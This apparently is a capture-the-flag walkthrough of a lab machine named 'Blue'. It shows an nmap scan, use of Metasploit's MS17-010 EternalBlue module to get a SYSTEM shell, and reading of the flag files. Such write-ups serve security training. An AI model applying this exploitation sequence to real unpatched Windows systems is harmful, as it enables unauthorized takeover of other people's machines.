## Box: Blue

## Target IP: `10.10.10.40`

---

### Initial Nmap Scan

Ran:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.10.10.40
```

Nmap output:

| Port | Service | Version |
| --- | --- | --- |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) |

Host is Windows 7 Professional SP1.

SMB signing disabled.

---

### Exploitation

Windows 7 SP1 screamed EternalBlue. No point wasting time.

Fired up Metasploit:

```bash
msfconsole
```

Searched:

```bash
search ms17-010
```

Used the EternalBlue exploit.

Set RHOSTS, LHOST, and payload options.

Launched exploit.

Got a Meterpreter session.

Switched to a real shell:

```bash
shell
```

Confirmed:

```bash
whoami
```

Output:

```
nt authority\system
```

Game over.

---

### Flags

Navigated:

```bash
cd C:\Users\haris\Desktop
type user.txt.txt
```

Grabbed user flag.

Then:

```bash
cd C:\Users\Administrator\Desktop
type root.txt.txt
```

Grabbed root flag. Very easy box
